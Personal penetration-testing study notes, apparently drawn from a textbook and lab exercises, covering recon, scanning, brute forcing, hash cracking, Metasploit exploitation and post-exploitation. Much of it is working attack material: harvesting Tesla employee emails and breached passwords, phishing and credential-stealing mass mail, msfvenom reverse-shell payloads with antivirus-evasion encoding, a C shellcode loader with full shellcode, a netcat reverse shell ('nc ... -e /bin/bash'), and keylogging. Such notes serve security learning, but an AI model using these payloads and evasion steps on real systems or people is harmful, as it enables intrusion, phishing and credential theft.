1. reconnaisance
	info gathering: passive and active
	passive: not scaning. facebook linkedin, no scan against target
	active scanning to get information about the target
	
	location information: satellite images, drone recond building layout: bages break areas security fencing
	job information : employees name job title phone number manager
		           pictures: photos desk photo computer photo etc
		           (for impersonation can ask questions from others on behalf of others) 	
		          passive recon web /host
		          target validation: whois nslooukup dnsrecon
		          subdomains: google fu, dig nmpa sublister bluto crt.sh etc
		          fingerprinting: nmap, wappalyzer, whatweb, builtwith netcat
		          data breaches: havelbeenpwned and similar lists
2. scanning and enumeration (most important)
	scanning: nmap nuxes nikto metaploit 
	enumeration: excalating privileges
3. gianing access
	exploits, social engineering
	maintaining access after kicked out, or detected
4. maintaining access
5. covering trucks



#######################example 1 ####################################
bugcrowd do tesla
go to hunter.io to register 20 
	search tesla.com
	export the contact as csv
	go to outlook and search the users: delay min means the user exist
	search 1.4 billion clear textpasswd on google to github
	download his pasrse.sh file from the youtube page
	>breach-parse @tesla.com tesla.txt #wait
	>ls #to see files
	>cat or use mousepad, gedit, nano to view the files
	
	goto tesla.com
	go the contact section
	you will find emails
	and images of satelites of the branches
	use the gps address and scan for live images
	check open gates, security guard, to gather enough information
	
	also
	go back to hunter and take a particular person and search on him online google
	you can email the employee
	go to linkedin see if you can find info. try twitter facebook
	
	google fu
	===========
	tesla.com
	site:tesla.com #info on that site only
	site:tesla.com -www #remove the www
	site:tesla.com -www -form #remove form too
	site:tesla.com filetype: pdf #you want only pdf
	
	thehavester searching email
	===========
	>theHarvester -d tesla.com -l 500 -b google/all #domain is tesla l 500 use google
	#returns emails and domain names
	
	haveibeenpwned.com and signup
	==================
	search your email to see if you have been breached previously
	
	bluto (brute force, zone transfer, dns reconnaisance widcard check, gogle linkedin etc)
	====================================================================
	pip install bluto (goes to ihavebeenpawned too)
	>bluto 
then	>tesla.com
	goto github for more info
	
				subdomains
				===========
	crt.sh 
	======
	>%tesla.com and then click search
	
				fingerprinting
				===============
	wapplyzer firefox addons 
	========================
	go to the site >tesla.com
	wapplyzer will give you inforamtion about the site front and backend
	can be false info put in the header to full
	so with the information, you check vulnerability pertaining to it
	examp php vulnerability
	sql injection to bypass login password
	
	whatweb
	======= 
	whatweb -v https://www.tesla.com
	>whatweb -v tesla.com
	
	Builtwith.com (search information without engaging yourip)
	==============
	search tesla.com 
	
	netcraft
	========
	go to the site and enter your target site for info
	
	whois
	=====
	whois google.com
	
	DNS RECONANNINSANCE
	====================
	nslookup wwww.google.com #might give you an ip address or contaxt info of the admin for you to make more search on them
	
	kali>nslookup 
	> set type=mx #find a mail server
	> google.com
	
	host -t ns gooogle.com #requests name of servers for the domain for mitm attack if all dns are tired to one server
	
	host -l zoneedit.com ns2.zoneedit.com
	#return results with ip addresses
	diff servers and their ip's
	
				scanning
				===========
	netcad 
	======
	nc -vv 192.168.88.2 80
	#it might give away infomation on apache, mail serveer etc
	#will report back if the port is opened
	
	wireshark
	=========
	>wireshark
	go to the site and look at the destination add from tcp with seq , seq ack, ack but ack last is rest
	
	
	nmap ####gives a list of open ports (you dont need to go over diff ports one at a time as in nc)
	======
	nmap -v -A scanme.nmap.org
	nmap -v -sn 192.168.0.0/16 10.0.0.0/8
	nmap -v -iR 10000 -Pn -p 80 -oA filenametosave#oA means output it in a all file version: xml,gmap and nmap
	
	192.168.88.2-10 #ip range
	root@kali:~# nmap -sV 192.168.20.10-12 -oA bookversionnmap #detail scan
	root@kali:~# nmap -sS 192.168.20.10-12 -oA bookversionnmap #OR sT

	>nmap -sn 192.168.88.0/24  #scans all my network and all ports 65535
	>nmap -T4 192.168.1.254 #targetting his router -T4 is thread == speed 
	>nmap -T4 192.168.1.254 -p- -A # -A all os, version, script scnning, traceroute. -p 80 means only 80; -p- all port
	so first scan nmap -T4 192.168.1.254 -p- to get the open ports
	then          nmap -T4 192.168.1.254 -p 80, 111, 53, 514 #ie those open from the above. -v   verbose to see update
	>nmap -sU -T4 ip ###udp scan USING -p- will take forver
	
	nmap more than just scan nse NMAP SCRIPTING ENGINGE (shows potential vulnerability and rule out some services ******can take the system down********8
	========================
	locate nmap/scripts
	cd /usr/share/nmap/scripts
	ls /usr/share/nmpa/scripts #all scripts for nmap
	webapp script
	>nmap -p 443 --script=all or --script=ssl-enum-cipher tesla.com ##checks the cipher and the strength
	nmap -sC ip or ip/24 or ip-10 #run port scan with script scan
	if we know there's nfs or checking if there is we can do this
	nmap --script-help nfs-ls #searching help on nfs
	root@kali:/# nmap --script=nfs-ls 192.168.20.11

	
	
	
	nessus (community 16 ip at a time) 
	==================================
	#vulnerability scanner for pentest/ethical hacker
	#external scan for information gathering 
	#also used in internal
	downolad nessus home after registrating x64 deb
	cd into download
	dpkg -i filename
	/etc/init.d/nessusd start #to start nessus
	then goto https://kali:8834
	create account
	install home version (nessus essential)
	insert your activation code
	username and password
	wait****
	new scan (can against any private ip; 16 at one time) will not work for externa host
	select either basic or advance scan
		General: name: any name
		         description: any thing
		discovery: folder: default
		type of scan = all ports
		assesment: scan type in assesment = known web vulnerabilies
		report: default
		advance: default
		ip: enter your target ip 192.16.23.33, tesla.com, etc
		save and lunch scan
		
		new  scan will take you to the homescreen
		#if you got credential to scan a target windows, ssh,snmp click credential and enter your detail; using not happening as pentester or hacker becasue you trying to do it without those
	#you can use the schedule to schedule tasks daily or otherwise or just one time
	#you can download as excel file
	
	facebook hack use social engineering
	
	metasploit scanner (help scanning many host at a go)
	==================
	> msfconsole #start metasploit
	>search portscan #search port. port scan open or closed
	> use auxiliary/scanner/portscan/syn
	>info #for information
	>options #just brief of info
	>set ports 1-65535 #set rhost
	>set rhosts 192.168.88.2 #sets target can  be a range 192.168.2-10
	>run or exploit 
	##anonymous ftp logins can be found using auxiliary/scanner/ftp/anonymous
	to search for an exploit after discoverying its presence on a webpage or host
	>use auxiliary
	> search tomcat

	
						webscanner
						==========
	NIKTO vulnerability scanner (nessus of web): focuses on dangerous files; outdates; misconfigurations
	======
	>nikto 
	>nikto -H
	>nikto -h https://tesla.com #does vulnerability scanning
	
	cadaver http://ip/folder #works with xamp to 
	BURP SUITE
	========== 
	(WORTH BYING WITH NUSSES 400 $ FOR BURP 350$ FOR NUSSUS)
	use foxyproxy addon for firefox to turnon burp suit as and when you start
	or set 127.0.0.1:80 manually
	go to proxy>interception on
	forward
	turn interception off
	go to target #or target>scope to hardcode ur url
	rightclickon site > filter the particular site
	rightclic on site and scan 
	select scan type 
	click on
	go to dashboard> veiw details for info
	scrawl site fights as in select a particular and then scan
	
	
				ENUMERATION  (HACK THE BOX)	
	=================================================================================\
	USING KIOPTRIK
	==============
	Download the image and run in vmware
	>ipconfig #get box ip address 
	>netdiscover #this alone will work
	>netdiscover -r 192.168.88.0/24 #discover devices or the other box to hackusing arp or mac adddreess = 192.168.88.133
	>run nesus
	>nmap -T4 -p- 192.168.88.133  #you will be picked up when their security is high
	#nmpa -T4 without p mean top 1000 or of 6553 
	#T4 is less faster but it is noisy
	#-A everything os, fingerprinting etc
	>namp -T4 -p -sU ip ###for udp
	ssh open 22
	http open 80 #####22 and 80 means theres a login that will take you to 22 to allow you to get a shell
	rpcbind open
	https: open 443
	>namp -T4 -p 22,80,443 192.168.88.128
	result=	
tarting Nmap 7.92 ( https://nmap.org ) at 2022-10-27 15:44 EDT
Nmap scan report for 192.168.88.128
Host is up (0.0040s latency).

PORT   STATE SERVICE
80/tcp open  http
Nmap done: 2 IP addresses (1 host up) scanned in 14.34 seconds

		his result= http, https, smb (file host) port 139, osidentification
		smb in nessus but not in nmap scan
		smb not a deal in internal network
		smb is good for exploit
		ssh not so good (brute froce, default credential) no remote code execution uisng exploit to get a shell
		http good in external network
		start 80 and 443
		
		his method
		==========
		look at port 80 443 139 
		login page: break or use sql injection
		enter the box ip in a brower http:// or https://192.168.88.133
		check source page code for comments embedded and accounts password and keys
		a test page might give out some info (poor hygeine)
		architures running (apache, linux might be seen)
		other question: is a dir running behind the site
		if no dir then poor hygeine to open port 80 or 443 helps an attacker see how bad the company is.
		try error page http://ip/93uuroue #4o4 error with information you need	
		
		use nikto with the ipadd web vulnerability scanner. good security they can stop you
		>nikto -h http://192.168.88.133 #take notes openssl, apache are vulnerabilty
		do research on them
		nikto has html version to make reading header
		will show vulnerabilities
				
		use dirbuster or others: dirb; gobuster, fuff etc
		<durb http://ip **********************************************
		 #will show you all the diretories in the ip
		
		or use ffuf****************************************************
		apt install ffuf
		>ffuf -w /usr/share/wordlist/dirbuster/double tab:FUZZ -u http://ip/FUZZ
		#fuzz the ip with the dirbuster to find directories on the site
		
		>dirbuster #for bruteforce seeing of directories ***************
		enter http://192.168.88.133:80
		tick speed fast
		browser select >/>usr/share/wordlist/dirbuster
		select your prefered option
		large can be found uisng github
		file exention is php for apache
		iis = asp, aspx, asm, asmx
		php, asa, sql, zip, tar, pdf, txt, bak can be added to extension
		click start
		and monitor findings
		rightclick and show on browser and file you found in any directory
		
		use burp suit ===> go down theres a section for that
				
		use curl to get header info of the main page
		curl --h 192.168.88.133
		
		check error page: ie page that does not exit  192.168.88.133/jlkfdajl
		
		notate using nmap
		nmap --script=ssl-enum-ciphers -p 443 192.168.88.133 #A is good F is poor
		capture the cipher 
		
		
		
		ourfindings in all scans on nessus, nmap
		========================================
		apache 1.3.20 port 80
		mod ssl 2.8.4 
		openssl0.9.6b
		openssh
		samba smbd port 139
		SMB signing not required nessus
		
		first thing to do
		google
		======
		go to google and search the first finding 
		apache? check exploilt.db from the search result
		cvedetails? the higher the num to 10 the higher the vul levl
		
		searchsploit
		============
		instead of going through google use 
		>search apache 1.3.30 or searchsploi samba or searhspoilt mod ssl
		>cat /usr/share/exploitdb/exploits/windows/remote/21204.txt #to see the exploit
		or cd /usr/share/exploitdb/exploits then to any of the files
		our finding here is kioptrix is running redhat so this will not apply
		>search mod_ssl 2.8.4 worked
		
		smbclient  FOR ANONYMOUS LOGIN to see files that might be valuable
		=========
		>smbclient -L \\\\192.168.88.133\\
		anonymous login will be successful
		you see files --> admin and ipcs
		add to notes
		>smbclient \\\\192.168.88.133\\ADMINS$ #ACCESS TO ADMIN PAGE USUALL DENIED
		>smbclient \\\\192.168.88.133\\IPCS$ #ANOTHER FOLDER FOUND FROM ABOVE
		smb: \> help ##may lead to deadend
		
		
		TELNET
		======
		telnet ip
		login name: admin or administratro or root
		root went through
		ls
		cat the file and see pass
		relogin with the hash
		
		SSH 
		=====
		take the version from the scan
		sometimes no ssh version
		attempt to connect to ssh through 
		if successful its exploitation
		>ssh ipddr #for old box it will give error
		>ssh ipdd -oKexAlgorithms=+diffie-hellman-group1-sha1 
		#anther errro add cipher
		>ssh ipdd -oKexAlgorithms=+diffie-hellman-group1-sha1 -c the_cipher_key
		confirm and connect
		may ask password: #if you have then go for it
		if you dont have you crack with brute force
		
		HYDRA (BRUTE FORCE)
		======
		hydra to test password strengh
		remember it will loud during brute-force
		>hydra -l root -P /usr/share/wordlist/metasploit/unix_pass.txt ssh://ip:22 -t 4 -V  	
		>hydra -L userlist.txt -P passwordfile.txt site_ip pop3 ##L file, l one user -p vs -P for password file
		>hydra -l user1 -P /usr/share/john/password.lst 192.168.0.2 ftp
		##me attacking ftp on lan i know the user, using john the rippeer password base
		>hydra -L userlist.txt -P password.txt 192.168.0.2 ftp  #FOUND THE user2 an d user
		>hydra -l user1 -P password.txt 192.168.0.2 ftp  ##and it found it user1
		###root is the username
		#tries to log in to the failed ssh using root as username and whole password in uni_pass.txt list
		#you can also use rockyou.txt
		check packetstormsecurity/Crackers/worldlists
		      openwall.com/wordlist
		      		OFFLINE PASSWORD ATTACK (HASHING)
		      		====================================
		     site: pastebin for free hashes
	ecrypt using symmetric key (same password for encrypting and decrypting)
	========================================================================
	aescrypt -e -p password filename
	aescript -d -p passwordEncrypted filename.aes
	(uses block or stream: x64 or padding) 
	
	Asymmetric crypto (slower but stronger and diff private for singing )
	======================================================================
	generate key:
	public key
	openssl genrsa -des3 -out private.key 4096 #will ask for password
	#generate rsa using des3; the output is private.key
	
	genrate public key with the private key:
	openssl rsa -in private.key -pubout -out public.key #take our private key and give us a public key
	
	encrytion with the public key
	------------------------------
	openssl rsautl -encrypt -pubin -inkey public.key -in texttoencrypt.txt -out 		encrytedText.txt #public.key is our created key; texttoenc is the text to be enc
	
	decrptying with the private key
	-------------------------------
	openssl rsautl -decrypt -inkey private.key -in encrytedText.txt -out decrptedText.txt #using our private key to decrypt our file into an output

	diff firsttext textafterdecryption #to show or prove if they are the same file 
	
				RECOVERING HASHES FROM SAM FILE
				===============================
				
	IN XP c:/windows/system32/config and backup c://windows/repair to get sam and and system
	bkhive system xpkey.txt #extract the bootkey to a text file
	samdump2 sam xpkey.txt # #use the same to decrypt the hash we got from the system or bootkey

				DUMPING PASSWORD HASHES WITH PHYSICAL ACCESS
				============================================
	I did this back then to use ubuntu live to bypass windows 7 password 2014
	in virtual box, we use the disk to mount a live disc without creating with pendrive
		simulate live cd boot ***********
	in windows 7 virtual box; set it to boot an iso
	edit .vmx in windows7 virtualbox filesystem and add bio.bootdeay=3000 #to allow up ample time to boot into boot mode 
	on booting win7, click esc key:make sure the virtual machine has taken over mouse and key control (alt + crtl)

	create a folder sda1 in /mnt == mkdir -p /mnt/sda1
	mount windows drive to tha  ==  mount /dev/sda1/ /mnt/sda1
	now cd into your mnt folder because can work with it: cd /mnt/sda1/Windows/System32/config
	extract bootkey from SYSTEM ====bkhive SYSTEM outfile
	use sam   ====== samdump2 SAM outfile
	
				LM VS NTM HASHING ALGORITHM (LAM AND NT LAN MANAGER)
				============================
	HASH FORMAT
	------------
	Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586cx
	Georgia Weidmanu:1000v:aad3b435b51404eeaad3b435b51404eew:8846f7eaee8fb117ad06bdd830b7586cx
	username:user_id:LM_pass_hash:NTLM_hash
	
	LM is weak
	xp stores in both
	win7 stores pass in nlm
	since the lm part are same it means the passw are the same
	
	reversing hash is diff; hence you can't go from a cipher to plaintext unless you know the math
	but if you can guess; you hash your case and compare hashes
				
				JOHN THE RIPPER
				===============
	goes through hashes to try and come up with the plaintext
	> john filewithhashes.txt 
	##john outpust PASSWORD has the cipher ####wow; crazy
	> john linuxhass.txt --wordlist=passwordfile.txt
	john the ripp supports adding rules either in teh file in /etc/john/john.conf where line says List.Rules:Wordlist ###you can add say 3 numb after using $[0-9]$[0-9]$[0-9]
				
				CRACKING CONFIGURATION FILE PASSWORD
				====================================
	use google to search for a plaintext 5f4dcc3b5aa765d61d8327deb882cf99 == password
	added info on this search is that there's a newuser with default pass wampp
				
				USING PRE-HASHED INSTEAD OF WORDLIST TO FIRST HASH BEFORE COMPARING TO SPEED UP PROCESS
				------------------------------------------------
	RAINBOW TABLE: PRECOMPUTED HASH
	DOWNLOAD ONLINE; at  http://project-rainbowcrack.com/table.htm 32gb
	sudo apt install rainbowcrack
	>rcrack #used to seep through the rainbow has
	
	use paid online services capable of cracking ntlm windows, sha-512, wpa2 https://www.cloudcracker.com
				POOL PLAINTEXT IN MEMORY WITH WINDOWS CREDENTIAL EDITIOR
				=======================================WCE
		Gets the plaintext form Local Security Authority Subsystem Service (LSASS) does the system security policy
		download it  
		http://www.ampliasecurity.com/research/wcefaq.html. 
		upload it when you get a shell uisng any of the methods: ftp or setting up a http server
		C:\>wce.exe -w #returns the password as georgia\bookxp:password
		you have to manage to login to find the password in memeory
		
		      			CREATING WORDLISTS
		      ===================================================
		CUSTOM WORDLIST GENERATOR
		========================= (SEARCHES A SITE TO GIVE US WORD LIST WE CAN USE IN BRUTE FORCE)
		cewl -w cewlgen.txt -d 1 -m 5 192.168.0.2 (-w output, -d depth ie multiple sites on the url, -m minimum password length)

		EVERY POSSIBLE WORD COMBINATION OF A PASSWORD? USING CRUNCH ALSO CALLED keyspace brute-forcing
		=====================================================
		crunch 5 10 abcedefqh  ##crunch min max password
		this alone will casue a 12gb or when i used my password
		all you need to know is the companies password policy min, max
		
		brute force using metasploit
		----------------------------
		msdfconsole
		>search ssh #to see available
		>use auxialiary/scanner/ssh/ssh_login
		>options
		>set username  root
		>set pass_file /usr/share/worlist/metasploit/unix_pass.txt
		>set rhost target
		>set threads 10 #will make it loud
		>set verbose true
		>run
		
		
		metasploit (exploits, auxilliary enumeration also searching, payloads, post exploit)
		============================================================
		>msfconsole 
		>search smb #but we want enum hence auxi not expoit nor post
		>use auxiliary/scanner/smb/smb_version or use the_module_num
		>options or info about the module loaded
		>set rhosts 192.168.88.133 #rhost = remote host ie target, lhost = us, attacker: rhots vs rhost /24
		>run
		any find? might fail but give you the correct samba version
		>searchsploit Samba 2.2 #found trans2open
		>mfs search trans2open
		>info info exploit/linux/samba/trans2open #to get information
		get permission before you attack
		

				SITUATIONS HERE USER USES FILTERS TO BLOCK INCOMING LISTNENINGS WITH UPTODATE PATCHES (client side software) when clicked the user expose sy
	ie we do not need a service to listen; we want a usr to open it	==========================================================================
	these exploits possible because even though it easy to update os to patch; app software are not easily updated by individuals let alone a whole company:
	also because people are weak; you use social engineering to send them mail to click that will run a href we wanted them to click either way-to run or download. 
	does not require direct network acess
	mostly use reverse shell(because we woundnt know when the user will do the clicking)
	we set a listerner on our side waiting to whenever they will click
	
	bypassing FILTERS WITH MSF PAYLOAD (browser expoilt ms08_967_netapi) still atacking a vulnerable machine (xp)
	--------------------------------
	filters might block port 4444 bc it knows its metasploit; so we full 80 and 443 that it finds okay
	EXAMPLE OF PAYLOADS that overcome filters= windows/shell/reverse_tcp_allports #will scan from 1 - 65535 to find open ports
	then set your expoilt #expoilt(ms08_067_netaphi)
	options: set rhosts == target; port=diff from payload and should not be 4444
	might waste time or feel like it's hunging
	
	http and https payloads design to handle such situations to bypass filters
	also have session recovery. but they too will not work if only a process of the browser is the only one configured to access the internet.
	so we need to exploit the browser itself.	
	clent side apps not listening on amy open port are as vul as those that does
	Client-side attacks are ideal for assets such as workstations or 
mobile devices that lack an Internet-facing IP address
	
	exploit/windows/browser/ms10_002_aurora ##browser exploit
	options
	SRVHOST instead RHOST: local ip add of server; 0.0.0.0 = listen to all add
	URIPATH link to malicious code
	take place in browser; os does not matter; iphon was jailbreak using browser
	so long as the browser is vul to that particular attack
	payload can be any of the shell; meter etc
	this works in pentest where you cant access vul from open ports but since it's pentest (you have access to the syst) you can go for the browser bc some companies might not have patched
	jobs #shows currently running jobs
	kill <job_num> #kills the job
	
	Running scrips in metapreter (used to keep crashing meterpreter by running a script to migrage it)
	----------------------------
	/usr/share/metasploit-framework/scripts/meterperter
	eg: migrate.rb ##helps migrate meterpr from memory of a ps to another.
	run <script name>
	meterpreter>run migrate
	
	
	msf> show advanced #gives us other options other than exploit and payload
	#AutoRunScript is what we need here
	msf> set AutoRunScript migrate -f ####automigrate immediately we get meterpr
	
	or use PrependMigrate to make sure the user does not quit the browser before mig in aboxe
	msf> set PrependMigrate true

	PDF EXPLOIT
	-----------
	msf > use exploit/windows/fileformat/adobe_utilprintf
	options
	set filename
	########search were metaspoloit keeps them
	copy filename and host server: python3 -m http.server 80
	use multi/handler
	set ExitOnSession false ###stop meter quiting after gettin one shell back; so many shells can be here
	anyone socially engineered to click on a link to our file will download and opening it gives us a shell
	
		
	PDF EMBEDDED EXEC (running the file .exe will prompt to run the pdf; given permission; it will run or exploi back to us; multi/handler will handle diff people
	-----------------
	exploit/windows/fileformat/adobe_pdf+embedded_exe
	ask the user permission to run an embedded code
	
	java exploit
	------------
	exploit/multi/browser/java_jre17_jmxbean through 
	a browser exploit same as the aurora exploit
	
	but we set jav/meterpre/reverse_http as the payload #with legit http traff to fooled browsers and firewalls; also we get hold of the shell without dropping
	
	java applet
	-----------
	exploit/multi/browser/java_signed_applet
	
	set payload java/meterpr/reverse_tcp
	show target #systems vulnerable to an attack
	
	browser_autopwn
	_______________
	click bait: set a payload to get back to us with all information including about add ons on the browsers;then suggest exploits (auxiliary)
	
	use auxiliary/server/browser_autopwn
	does not need payload
	after a user clicks on the link; it exploits it and gives a shell
	
	wamp configuration file replace
	-------------------------------
	exploit/windows/fileformat/winamp_maki_bof
	set payload windows/mete/rever_tcp
	package the file to look real by using the right confi and replacing a file with yours
	social engi them to downlaod and install and you get a shell
	
	SETTOOLKIT
	------------
	setookit
	email spear attack
	exploit -j
	
	web attack uisng clone websites: (ip forwarding in case you using nat)
	
	MASS EMAIL ATTACKS
	Make a file with list of emails to send to
	run exploit and each gets a copy
	most importantly; you can either send a malicious file or credential stealing using a fake website; embed the link in href and write something nice as output. to fool user to give our their ids
	
				ANTI VIRUS EVASION
				------------------
	happens when metersploit or malicious code tries to write to disk.
	trojan: a normal file executiing while habouring a deadly code underneath
	
	USING BIANRIES
	use -x and -k to hide trojan in msfvenom
	-x selects executable to hide payload
	and -k runs it in a diff thread
	##locate binaries ##gives you binary options
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
	configure metasploit too
	
	after downlaoding a file: use >md5sum to get the hash of your download and compare with the original to see if a trojan has been embedded. which is so should the hash be diff
	
	or use a better and trusted 
	root@kali:~# sha512sum /usr/share/windows-binaries/radmin.exe
	root@kali:~# sha512sum radmin.exe
	
	2 types of antivirus: 
		static: gets update of malicious code which it uses to catch viru
		dynamic; any suspected activity will be flaged
	evading microsoft security essentials
	=====================================
	windows def with realtime scannin will detect malicious programs
	https://www.virustotal.com/ #to varify if your malicious code will get flags
	best you downlaod it offline and test it, bc to them anyfile you upload is malic
	
	Getting past an antivirus
	---------------------------
	hides characters in programs that will expose you
	
	msfvenom -l encoders #to see the list of encoders we got
	
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f exe > meterpreterencoded.exe #encoding payload to evade detection
	#the above was still detected by virustatal. 
	
	use multiple encoders to improve evasion
	-----------------------------------------
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -e x86/shikata_ga_nai -i 10 -f raw > meterpreterencoded.bin

	root@kali:~# msfvenom -p -w -f exe -a x86x --platform windowsy -e x86/bloxor 
-i 2 > meterpretermultiencoded.exe < meterpreterencoded.bin

	uisng binary and encoding (does a better job than the above)
	----------------------------
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -e x86/shikata_ga_nai 
-i 10 -f exe > radminencoded.exe
	
	#########use payloads other than metasploit
	
	use custom cross compiling using shellcode
	-------------------------- (since antivirus vendors know all the metaspl payloads)
	
	1 ##save as custommeterpreter.c 
	#include <stdio.h>
	unsigned char random[]= u //will be replaced by urandom in "";
	unsigned char shellcode[]= v
	int main(void) w
	{ 
	 ((void (*)())shellcode)();
	}
	
	2. run msfv with f flag=  -f c 
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 
LPORT=2345 -f c -e x86/shikata_ga_nai -i 5
	
	3. add randomness : locate urandom
	cat urandom | tr -dc A-Z-a-z-0-9 | head -c512 ##will give you a char string of first 512 
	(root㉿kali)-[/usr/share/man/man4]
└─# cat urandom.4.gz|tr -dc A-Z-a-z-0-9 | head -c512
ZksbHzmsSRL4jf8vLihVy4hIqq2UNBoxMSta4xX-b7TebkfWalqd5PXQ5BGgqI4lS7wr6HMlHdki0oSPhjoumu8wIuVxiKHGAxtWGsCITgetZqjT9TkqVB84PO2DeqqqtIiusYgEnxngAV3raR82TdgvnNDD8iGLAsbrFmbNhGdTzZnseHiGqxdUy1bhoWsBGxPTvxiXgs1QC1o-9RNHSo2wTAYMpPU3Xqf7eHMq-mxpq1tXb2NcfipUQuJXUM88CB5NXYqggTn7bYIrnfQHNQLXrOsdLcOHjcsbhEmLztAs1kT7oYmrPb0S09HtqfeC-L3DeAdIThs6Y3-IHY9ZgBQPlXXYlpPyf0H5WEX3dfXrKwxmD0IFYL3IBynlazrBY3CeJ1--lD4Dm4op3vVQRUh4uMDgK8MrtTlnAC080QalmGOcxUZFBEvpqqFNhQ4wwZJgpx8seUrxm2Wd61GQjaWmv0F9c5stTgTcchDRoZSjzpNgmDM4EbGH0tc7b7Xj   
	4. copy and replace u ie update your cutommeterpreter.c script to contain randown text you got above
	
	5. paste this as shellcode
	"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
"\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50"
"\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a"
"\x05\x68\x0a\x00\x01\x09\x68\x02\x00\x09\x29\x89\xe6\x6a\x10"
"\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e"
"\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56"
"\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10"
"\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a"
"\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6"
"\x85\xf6\x75\xec\xc3";

	6. copile the program with c uisng mingw32 cross compiler
	apt-get install mingw32
	i586-min-gw32msvc-gcc
	
	root@kali:~# i586-mingw32msvc-gcc -o custommeterpreter.exe custommeterpreter.c
	
	7. test with virustutoal = only 18 antivirus detected it
	
	ENCRYPTING EXECUTABLES WITH HYPERION TO EVADE ANTIVIRUS (you need wine to run this)
	-------------------------------------------------------
	root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=2345 -f exe > meterpreter.exe
	
	cd Hyperion-1.0/
	root@kali:~/Hyperion-1.0# wine ../hyperion ../meterpreter.exe bypassavhyperion.exe
							input          output
	upload it to virustotal 27 antiviurs detected. windows defender couldnt detect
	 
	 PYTHON SHELLCODE INJECTION WITH WINDOWS API
	 --------------------------------------------
	 VirtualAlloc injection method: convert the final python into exe
	 the c code above can be mimicked wtih python uisng python's ctypes library
	 EVADING ANTI VIRUS WITH VIEL-EVASION with pyhon virtualAlloc inj
	 -------------------------------------
	 1. downlaod on github (veil-evasion-master)
	 2. cd into folder
	 3. ./Veil-Evation.py
	 4> list #to see list of payloads
	 5 select python/shellcode_inject/aes_encrypt ##for teh virualalloc
	 6 >generate
	 7.> 1 #for default
	 8.> 1 #pyinstaller (exe)
	 
	 HIDDING IN PLAIN SIGHT TO BEAT ANTIVIRUS
	 ----------------------------------------
	 1. learn to code and mimic pyaload functions with windows api
	 create your own. 
	 2. pay for it to be signed 
	 
	 
	 		post exploitation
	 		-----------------
	 >sessions -l #list sessions
	 >sessions -i 1 #selects the fisrst session
	 >help upload
	 meterpreter > upload /usr/share/windows-binaries/nc.exe C:\\ 
	> getuid #to get user inforamtion
	 
	 other commands: keylogging; and webcam spying all supported
	 2. run scripts in meterpreter? 
	 run migrate -h
	 ps #shows process in meter
	 run migrate -p 1144 #migrating to another ps using it pid
	 ##migrating to a diff ps can change your previl level
	 
	 msf > use post/windows/gather/enum_logged_on_users #shows user currently logged on
	> set session 1 #how to set session
	
	Railgun (metasploit addon that communicates with windows api)
	-------------------------------------------------------------
	session -i <session id>
	irb
	client.railgun.shell32.IsUserAnAdmin
	other modules for railgun
		: windows/gather/reverse_lookup.rb and windows/manage/download_exec.rb
	
	local pri escalation
	--------------------
	getsystem -h
	getsystem #runs a series until one succeeds
	getuid #for confirmation
	exploit/windows/local/ms11_080_afdjoinleaf #exploits afd.sys in windows
	
	show options
	
	bypass uac wind 7 = use exploit/windows/local/bypassuac
	
	udev in linux
	--------------
	shell
	whoami
	uname -a
	
	udevadm --version
	seaerchsploit udev
	root@kali:~# cp /usr/share/exploitdb/platforms/linux/local/8572.c /var/www #copy exploit to www to be hosted
	georgia@ubuntu:~$ wget http://192.168.20.9/8572.c #download in meterpre
	georgia@ubuntu:~$ gcc -o exploit 8572.c		  #compile
	georgia@ubuntu:~$ cat /proc/net/netlink
	georgia@ubuntu:~$ ps aux | grep udev
	
	georgia@ubuntu:~$ cat /tmp/run 
	#!/bin/bash
	nc 192.168.20.9 12345 -e /bin/bash
	root@kali:~# nc -lvp 12345
	georgia@ubuntu:~$ ./exploit 2468
	whoami
	
	find information
	----------------
	meterperter> search -f *password* #searches password
	
	setting up a keylogger
	----------------------
	meter> keyscan_start
	meter> keyscan_dump #gives you back every word typed
	
	gather credentials
	-------------------
	use post/windows/gather/credentials/whateveryouwant 
